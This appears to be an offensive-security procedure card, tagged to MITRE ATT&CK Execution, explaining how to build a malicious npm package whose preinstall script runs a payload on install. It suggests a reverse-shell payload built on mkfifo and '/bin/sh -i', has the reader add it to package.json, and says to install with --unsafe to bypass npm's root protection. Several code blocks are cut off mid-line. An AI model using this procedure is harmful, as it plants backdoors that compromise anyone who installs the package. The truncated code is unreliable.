---
id: 581f0383-055d-4e0b-a5d5-5f64f2d1e085
name: Create a Malicious NodeJS npm Package
type: procedure
verified: true
submitted: true
created_at: '2019-10-31T22:50:53.903674+00:00'
updated_at: '2023-05-26T18:53:01.582006+00:00'
tactics:
- '[[Execution|TA0002 - Execution]]'
techniques:
- '[[Exploitation for Client Execution|T1203 - Exploitation for Client Execution]]'
platforms:
- Linux
tags:
- '[[backdoor]]'
commands:
- '[[npm Install a Package with Preinstall Scripts]]'
---

# Create a Malicious NodeJS npm Package

**Status**: ✓ Verified

## Summary

Nodejs' package manager npm can executes commands while it installs a package, giving attackers an opportunity to create malicious packages which execute their code. While npm has controls to mitigate this vulnerability when run with root privileges, installing the package with the --unsafe flag wi

## Description

# Description

Nodejs' package manager npm can executes commands while it installs a package, giving attackers an opportunity to create malicious packages which execute their code. While npm has controls to mitigate this vulnerability when run with root privileges, installing the package with the `--unsafe` flag will disable them.



# Instructions

1. Select a payload. Suggested:





**Code**: [[rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1]]





2. Create a new directory for the package, then initialize it.



**Code**: [[mkdir -p pwnme && cd pwnme && npm init]]



3. Modify package.json, adding an entry for `preinstall` and the payload. in the `scripts` section.



Before:



**Code**: [[{
  "name": "pwnme",
  "version": "1.0.0",
  "desc]]



After:





**Code**: [[{
  "name": "pwnme",
  "version": "1.0.0",
  "desc]]



Note: Do not forget to add a comma after the 'test' entry.



4. Install the package. Use `--unsafe` if installing the package with root privileges.





**Command** ([[npm Install a Package with Preinstall Scripts]]):

```bash
npm i $PACKAGE --unsafe
```































## Platforms

- Linux

## MITRE ATT&CK Mapping

### Tactics

- [[Execution|TA0002 - Execution]]

### Techniques

- [[Exploitation for Client Execution|T1203 - Exploitation for Client Execution]]

## Commands Used

- [[npm Install a Package with Preinstall Scripts]]

## Tags

- [[backdoor]]


